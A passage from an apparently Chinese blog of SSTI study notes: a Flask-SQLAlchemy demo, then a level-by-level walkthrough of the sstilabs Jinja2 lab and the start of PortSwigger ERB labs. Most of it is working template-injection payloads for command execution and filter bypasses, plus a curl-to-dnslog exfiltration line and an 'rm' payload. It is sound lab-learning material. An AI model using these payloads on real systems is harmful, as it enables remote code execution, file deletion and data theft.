使用前记得先建表。。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置每次请求结束后会自动提交数据库中的改动</span></span><br><span class="line">app.config[<span class="string">&#x27;SQLALCHEMY_COMMIT_ON_TEARDOWN&#x27;</span>] = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SQLALCHEMY_TRACK_MODIFICATIONS&#x27;</span>] = <span class="literal">True</span></span><br><span class="line"><span class="comment"># 查询时会显示原始SQL语句</span></span><br><span class="line">app.config[<span class="string">&#x27;SQLALCHEMY_ECHO&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">db = SQLAlchemy(app)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Role</span>(db.Model):</span><br><span class="line">    <span class="comment"># 定义表名</span></span><br><span class="line">    __tablename__ = <span class="string">&#x27;roles&#x27;</span></span><br><span class="line">    <span class="comment"># 定义列对象</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">64</span>), unique=<span class="literal">True</span>)</span><br><span class="line">    us = db.relationship(<span class="string">&#x27;User&#x27;</span>, backref=<span class="string">&#x27;role&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(db.Model):</span><br><span class="line">    __tablename__ = <span class="string">&#x27;users&#x27;</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">64</span>), unique=<span class="literal">True</span>, index=<span class="literal">True</span>)</span><br><span class="line">    email = db.Column(db.String(<span class="number">64</span>), unique=<span class="literal">True</span>)</span><br><span class="line">    pswd = db.Column(db.String(<span class="number">64</span>))</span><br><span class="line">    role_id = db.Column(db.Integer, db.ForeignKey(<span class="string">&#x27;roles.id&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="comment"># 查询所有角色和用户</span></span><br><span class="line">    roles = Role.query.<span class="built_in">all</span>()</span><br><span class="line">    users = User.query.<span class="built_in">all</span>()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, roles=roles, users=users)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 创建所有数据库表</span></span><br><span class="line">    <span class="keyword">with</span> app.app_context():</span><br><span class="line">        <span class="comment"># 一开始没这句老报错</span></span><br><span class="line">        db.drop_all()</span><br><span class="line">        db.create_all()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 插入测试数据</span></span><br><span class="line">        ro1 = Role(name=<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">        ro2 = Role(name=<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">        db.session.add_all([ro1, ro2])</span><br><span class="line">        db.session.commit()</span><br><span class="line"></span><br><span class="line">        us1 = User(name=<span class="string">&#x27;wang&#x27;</span>, email=<span class="string">&#x27;wang@163.com&#x27;</span>, pswd=<span class="string">&#x27;123456&#x27;</span>, role_id=ro1.<span class="built_in">id</span>)</span><br><span class="line">        us2 = User(name=<span class="string">&#x27;zhang&#x27;</span>, email=<span class="string">&#x27;zhang@189.com&#x27;</span>, pswd=<span class="string">&#x27;201512&#x27;</span>, role_id=ro2.<span class="built_in">id</span>)</span><br><span class="line">        us3 = User(name=<span class="string">&#x27;chen&#x27;</span>, email=<span class="string">&#x27;chen@126.com&#x27;</span>, pswd=<span class="string">&#x27;987654&#x27;</span>, role_id=ro2.<span class="built_in">id</span>)</span><br><span class="line">        us4 = User(name=<span class="string">&#x27;zhou&#x27;</span>, email=<span class="string">&#x27;zhou@163.com&#x27;</span>, pswd=<span class="string">&#x27;456789&#x27;</span>, role_id=ro1.<span class="built_in">id</span>)</span><br><span class="line">        db.session.add_all([us1, us2, us3, us4])</span><br><span class="line">        db.session.commit()</span><br><span class="line"></span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>index.html文件</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Flask-SQLAlchemy Example<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Roles:<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        &#123;% for role in roles %&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123; role.name &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Users:<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        &#123;% for user in users %&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123; user.name &#125;&#125; - &#123;&#123; user.email &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>http://127.0.0.1:5000/</code></p>
+<h1 id="别的模板"><a href="#别的模板" class="headerlink" title="别的模板"></a>别的模板</h1><p>先干ssti去了，，有缘再见<br>php<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/phpstudy2015-6/p/6216107.html">Smarty的基本使用与总结 - 那一叶随风 - 博客园</a><br>js<br><a target="_blank" rel="noopener" href="https://ejs.bootcss.com/#docs">EJS – 嵌入式 JavaScript 模板引擎 | EJS 中文文档</a><br><img src="https://pic.imgdb.cn/item/64c37b081ddac507cc38b2fa.jpg"></p>
+<h1 id="sstilabs"><a href="#sstilabs" class="headerlink" title="sstilabs"></a>sstilabs</h1><p><a target="_blank" rel="noopener" href="https://github.com/X3NNY/sstilabs">X3NNY&#x2F;sstilabs: A lab to help you learning SSTI</a></p>
+<h2 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h2><p>进入sstilabs-master\flasklab文件夹<br><code>pip install -r requirements.txt</code></p>
+<p><code>python app.py</code><br>一直报错<br>把requirements.txt改成<br><code>Flask&gt;=2.0.1</code><br>try again</p>
+<h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>no waf</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">ssti</span>(<span class="params"></span>) &#123;</span><br><span class="line">    $.<span class="title function_">post</span>(&#123;</span><br><span class="line">        <span class="attr">url</span>: <span class="string">`/level/<span class="subst">$&#123;get_level()&#125;</span>`</span>,</span><br><span class="line">        <span class="attr">contentType</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">        <span class="attr">data</span>: <span class="string">`code=<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>($(<span class="string">&quot;input[name=&#x27;code&#x27;]&quot;</span>).val())&#125;</span>`</span>,</span><br><span class="line">        <span class="attr">success</span>: <span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">            $(<span class="string">&quot;#res&quot;</span>).<span class="title function_">html</span>(res)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看出来是post方式<br><code>code=&#123;&#123; ''.__class__  &#125;&#125;</code>–&gt;<code>&#123;&#123; ''.__class__  &#125;&#125;</code>该实例的对应的类</p>
+<p><code>code=&#123;&#123; ''.__class__.__base__  &#125;&#125;</code>–&gt;<code>&lt;class &#39;object&#39;&gt;</code>当前类的父类</p>
+<p><code>code=&#123;&#123; ''.__class__.__base__.__subclasses__()  &#125;&#125;</code>–&gt;包含当前类所有子类的一个列表</p>
+<p>找到了个get的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> res</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">400</span>):</span><br><span class="line">    url=<span class="string">&quot;http://127.0.0.1:5000/ssti?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[%d].__init__.__globals__&#125;&#125;&quot;</span></span><br><span class="line">    response=res.get(url%i)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(response.text),i,response.status_code)</span><br></pre></td></tr></table></figure>
+<p>chat老师改了个post的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:5000/level/1&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[%d].__init__.__globals__&#125;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">400</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;code&quot;</span>: payload % i&#125;</span><br><span class="line">    response = requests.post(url, data=data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(response.text), i, response.status_code)</span><br></pre></td></tr></table></figure>
+<p>每行三个数字对应：响应包，下标，状态码<br>有好多。。随机选一个104<br><code>code=&#123;&#123; ''.__class__.__base__.__subclasses__()[104].__init__.__globals__ &#125;&#125;</code><br>选择__import__<br><code>code=&#123;&#123; ''.__class__.__base__.__subclasses__()[104].__init__.__globals__['__import__'] &#125;&#125;</code><br>然后有<code>&lt;function __import__ at 0x000002BFB1BC3F60&gt;</code></p>
+<p>所以<br><code>code=&#123;&#123; ''.__class__.__base__.__subclasses__()[104].__init__.__globals__['__import__']('os').popen('type .\\flag').read() &#125;&#125;</code></p>
+<p>我搜了一下别人的wp基本都是bp做的，but我电脑坏了之后bp还没装回来，也懒得开虚拟机。。所以先凑合凑合👍🥺<br>感觉我的做法有一种淳朴的美，不懂的永别了。。。！</p>
+<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>过滤了两个花括号，用print<br><code>&#123;%print ''.__class__.__base__.__subclasses__()[104].__init__.__globals__['__import__']('os').popen('type .\\flag').read()%&#125;</code></p>
+<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>no waf但是盲注。。<br>好像有两种办法nc命令将文件内容&#x2F;dnslog外带。。</p>
+<hr>
+<p>过了一天。。美好的一天从放弃*ctf开始<br><code>code=&#123;&#123; ''.__class__.__base__.__subclasses__()[104].__init__.__globals__['__import__']('os').popen('curl http://xxxxxx.ceye.io/`type .\\flag`').read() &#125;&#125;</code></p>
+<p><code>code=&#123;&#123; ''.__class__.__base__.__subclasses__()[104].__init__.__globals__['__import__']('os').popen('curl http://xxxxxx.ceye.io/%25%36%30%25%37%34%25%37%39%25%37%30%25%36%35%25%32%30%25%32%65%25%35%63%25%35%63%25%36%36%25%36%63%25%36%31%25%36%37%25%36%30').read() &#125;&#125;</code><br>我不明白。。Remote Addr处显示<br><code>http://xxxxxx.ceye.io/`type ./flag` </code><br>变，你给我变啊（大声</p>
+<p>特别特别绝望，，先做下一题了</p>
+<h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>过滤中括号<br>__getitem__绕中括号限制<br><code>&#39;&#39;.__class__.__base__.__subclasses__()[104]</code>&#x3D;<code>&#39;&#39;.__class__.__base__.__subclasses__().__getitem__(104)</code></p>
+<p><code>()[&quot;__class__&quot;]</code>&#x3D;<code>()|attr(&quot;__class__&quot;)</code>&#x3D;<code>().__getattribute__(&quot;__class__&quot;)</code></p>
+<p><code>[&#39;__import__&#39;]</code>&#x3D;<code>.__getitem__(&#39;__import__&#39;)</code></p>
+<p>psyload<br><code>code=&#123;&#123; ''.__class__.__base__.__subclasses__().__getitem__(104).__init__.__globals__.__getitem__('__import__')('os').popen('type .\\flag').read() &#125;&#125;</code></p>
+<h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p>过滤了单双引号<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/359392.html">详解Flask SSTI 利用与绕过技巧V2 - FreeBuf网络安全行业门户</a></p>
+<blockquote>
+<p>过滤引号</p>
+<p>request对象绕过<br>request有两种形式，request.args和request.values，POST和GET传递的数据都可以被接收。<br><code>?name=&#123;&#123;''.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__.__builtins__.__import__(request.args.v1).popen(request.values.v2).read()&#125;&#125;&amp;v1=os&amp;v2=whoami</code></p>
+<p>chr绕过<br>GET请求时，+号记得url编码，要不会被当作空格处理。<br><code>?name=&#123;% set chr=().__class__.__mro__[1].__subclasses__()[139].__init__.__globals__.__builtins__.chr%&#125;&#123;&#123;''.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__.__builtins__.__import__(chr(111)%2Bchr(115)).popen(chr(119)%2Bchr(104)%2Bchr(111)%2Bchr(97)%2Bchr(109)%2Bchr(105)).read()&#125;&#125;</code></p>
+</blockquote>
+<p>本题payload<br><code>code=&#123;&#123; [].__class__.__base__.__subclasses__()[104].__init__.__globals__[request.values.arg1](request.values.arg2).popen(request.values.arg3).read() &#125;&#125;&amp;arg1=__import__&amp;arg2=os&amp;arg3=type .\\flag</code></p>
+<h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p>过滤下划线</p>
+<ul>
+<li>十六位编码<br><code>code=&#123;&#123; ''["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()[104]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]['\x5f\x5fimport\x5f\x5f']('os').popen('type .\\flag').read()&#125;&#125;</code></li>
+</ul>
+<p>还有</p>
+<ul>
+<li>Unicode编码</li>
+<li>attr()配合request</li>
+</ul>
+<h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><p>过滤<code>.</code><br>问就是改改上一题<br><code>code=&#123;&#123; ''["__class__"]["__base__"]["__subclasses__"]()[104]["__init__"]["__globals__"]['__import__']('os')['popen']('type \x2e\\flag')['read']()&#125;&#125;</code></p>
+<p>还有</p>
+<ul>
+<li>attr()</li>
+</ul>
+<h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p>过滤关键字<code>[&quot;class&quot;, &quot;arg&quot;, &quot;form&quot;, &quot;value&quot;, &quot;data&quot;, &quot;request&quot;, &quot;init&quot;, &quot;global&quot;, &quot;open&quot;, &quot;mro&quot;, &quot;base&quot;, &quot;attr&quot;]</code></p>
+<p>拼接字符<br><code>code=&#123;&#123; ''["__cl"+"ass__"]["__ba"+"se__"]["__subcla"+"sses__"]()[104]["__in"+"it__"]["__glo"+"bals__"]['__import__']('os')['pop'+'en']('type \x2e\\flag')['read']()&#125;&#125;</code></p>
+<h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p>过滤数字<br>偷偷抄抄改改别人的</p>
+<ul>
+<li><p>for<br><code>&#123;% for i in (''.__class__.__mro__|last()).__subclasses__() %&#125;&#123;% if i.__name__=='Popen' %&#125;&#123;&#123; i.__init__.__globals__.__getitem__('os').popen('type .\\flag').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></p>
+</li>
+<li><p>lipsum<br><code>&#123;&#123;lipsum|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("type .\\flag")|attr("read")()&#125;&#125;</code></p>
+</li>
+<li><p>构造数字<br>不知道为什么构造数字不成功。。</p>
+<ul>
+<li>做到level11回来看一眼<br> <code>&#123;% set yi=dict(a=a)|join|count %&#125;&#123;% set er=dict()|join|count %&#125;&#123;% set san=dict(aaaaa=a)|join|count %&#125;&#123;% set zh=(yi~er~san)|int %&#125;&#123;&#123;().__class__.__base__.__subclasses__()[zh].__init__.__globals__['__import__']('os').popen('type .\\flag').read()&#125;&#125;</code><br> 成功</li>
+</ul>
+</li>
+</ul>
+<h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><p>WAF: set config &#x3D; None</p>
+<p>target: get config</p>
+<p>去看了别人的wp</p>
+<p>不知道为什么我url_for不成功<br>但是<br>get_flashed_messages成功了</p>
+<p><code>&#123;&#123;get_flashed_messages.__globals__['current_app'].config&#125;&#125;</code></p>
+<p>我看了眼<code>&#123;&#123;url_for.__globals__&#125;&#125;</code>，它就没有’current_app’</p>
+<h2 id="level11-13"><a href="#level11-13" class="headerlink" title="level11-13"></a>level11-13</h2><p>以下就是跟着别人的wp过一遍<br><a target="_blank" rel="noopener" href="https://johnfrod.top/ctf/flask-ssti-lab%E6%94%BB%E7%95%A5/">Flask SSTI LAB攻略 – JohnFrod’s Blog</a></p>
+<p><code>&#123;&#123;lipsum|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("type /x2e\\flag")|attr("read")()&#125;&#125;</code></p>
+<h3 id="过滤下划线-x2F-空格"><a href="#过滤下划线-x2F-空格" class="headerlink" title="过滤下划线&#x2F;空格"></a>过滤下划线&#x2F;空格</h3><p>用<code>&#123;&#123;(lipsum|string|list)&#125;&#125;</code>获取<br><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/64c5e48a1ddac507cc0eca90.jpg"><img src="https://pic.imgdb.cn/item/64c5e48a1ddac507cc0eca90.jpg"></a><br>下标18为下划线，下标9为空格</p>
+<p><code>&#123;% set xiahuaxian=(lipsum|string|list)|attr(pop)(18)%&#125;</code></p>
+<p><code>&#123;% set space=(lipsum|string|list)|attr(pop)(9)%&#125;</code></p>
+<h3 id="attr-内字符串构造"><a href="#attr-内字符串构造" class="headerlink" title="attr()内字符串构造"></a>attr()内字符串构造</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> pop=<span class="built_in">dict</span>(pop=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xiahuaxian=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(<span class="number">18</span>)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> space=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(<span class="number">9</span>)%&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="构造类"><a href="#构造类" class="headerlink" title="构造类"></a>构造类</h3><p><code>&#123;% set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</code><br><code>&#123;% set getitem=(xiahuaxian,xiahuaxian,dict(getitem=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</code></p>
+<h3 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> space=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(<span class="number">9</span>)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> os=<span class="built_in">dict</span>(os=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> popen=<span class="built_in">dict</span>(popen=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> type1=<span class="built_in">dict</span>(<span class="built_in">type</span>=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cmd=(type1,space,<span class="built_in">dict</span>(flag=a)|join)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> read=<span class="built_in">dict</span>(read=a)|join%&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="完整利用语法"><a href="#完整利用语法" class="headerlink" title="完整利用语法"></a>完整利用语法</h3><p><code>&#123;&#123;(lipsum|attr(globals))|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;</code></p>
+<h3 id="合起来"><a href="#合起来" class="headerlink" title="合起来"></a>合起来</h3><h4 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> pop=<span class="built_in">dict</span>(pop=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xiahuaxian=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(<span class="number">18</span>)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> space=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(<span class="number">9</span>)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">globals</span>=(xiahuaxian,xiahuaxian,<span class="built_in">dict</span>(<span class="built_in">globals</span>=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> getitem=(xiahuaxian,xiahuaxian,<span class="built_in">dict</span>(getitem=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> space=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(<span class="number">9</span>)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> os=<span class="built_in">dict</span>(os=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> popen=<span class="built_in">dict</span>(popen=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> type1=<span class="built_in">dict</span>(<span class="built_in">type</span>=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cmd=(type1,space,<span class="built_in">dict</span>(flag=a)|join)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> read=<span class="built_in">dict</span>(read=a)|join%&#125;</span><br><span class="line">&#123;&#123;(lipsum|attr(<span class="built_in">globals</span>))|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><del>是这样，我写到这里才发现<code>type flag</code>就可以读取了而我每次都败北在怎么处理<code>type .\\flag</code>的点和杠</del></p>
+<h5 id="level12-13"><a href="#level12-13" class="headerlink" title="level12,13"></a>level12,13</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> nine=<span class="built_in">dict</span>(aaaaaaaaa=a)|join|count %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> et=<span class="built_in">dict</span>(aaaaaaaaaaaaaaaaaa=a)|join|count %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> pop=<span class="built_in">dict</span>(pop=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xiahuaxian=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(et)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> space=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(nine)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">globals</span>=(xiahuaxian,xiahuaxian,<span class="built_in">dict</span>(<span class="built_in">globals</span>=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> getitem=(xiahuaxian,xiahuaxian,<span class="built_in">dict</span>(getitem=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> space=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(nine)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> os=<span class="built_in">dict</span>(os=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> popen=<span class="built_in">dict</span>(popen=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">type</span>=<span class="built_in">dict</span>(<span class="built_in">type</span>=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cmd=(<span class="built_in">type</span>,space,<span class="built_in">dict</span>(flag=a)|join)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> read=<span class="built_in">dict</span>(read=a)|join%&#125;</span><br><span class="line">&#123;&#123;(lipsum|attr(<span class="built_in">globals</span>))|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>美好的一天从做完sstilabs开始。。。👍🥺</p>
+<h1 id="portswigger的Server-side-template-injection模块"><a href="#portswigger的Server-side-template-injection模块" class="headerlink" title="portswigger的Server-side template injection模块"></a>portswigger的Server-side template injection模块</h1><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/server-side-template-injection#constructing-a-server-side-template-injection-attack">Server-side template injection | Web Security Academy</a><br>。。特别特别绝望。。为什么不能全世界都说中国话。。。<br>美好的一天因为看不懂英文结束。。。👎🥲</p>
+<h2 id="Basic-server-side-template-injection"><a href="#Basic-server-side-template-injection" class="headerlink" title="Basic server-side template injection"></a>Basic server-side template injection</h2><p>已知：ERB模板，任务是delete the morale.txt file from Carlos’s home directory</p>
+<p>别的都可以打开，只有第一个不能，发现是get形式<br><code>?message=Unfortunately%20this%20product%20is%20out%20of%20stock</code><br>搜了ERB注入<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/29440823">手把手教你如何完成Ruby ERB模板注入 - 知乎</a><br>先<code>?message=&lt;%= 7 * 7 %&gt;</code>看看，返回49————熟悉感上来了啊uus。。</p>
+<p><code>?message=&lt;%= system(&quot;ls&quot;) %&gt;</code>看看<br>返回<code>morale.txt true</code></p>
+<p>psyload<br><code>?message=&lt;%= system(&quot;rm /home/carlos/morale.txt&quot;) %&gt;</code></p>
+<p>真该死啊题目说Carlos我搞半天才发现要小写才成功</p>
+<h2 id="Basic-server-side-template-injection-code-context-全是废话与题无关"><a href="#Basic-server-side-template-injection-code-context-全是废话与题无关" class="headerlink" title="Basic server-side template injection (code context)(全是废话与题无关)"></a><del>Basic server-side template injection (code context)(全是废话与题无关)</del></h2><p>Tornado 模板</p>
+<p>题目提示Preferred name<br>发现这是post传参<br><code>blog-post-author-display=user.first_name&amp;csrf=bKRQjUQkapqGnDg6fYITYXNuFi6W59Rl</code><br>看一眼源代码</p>
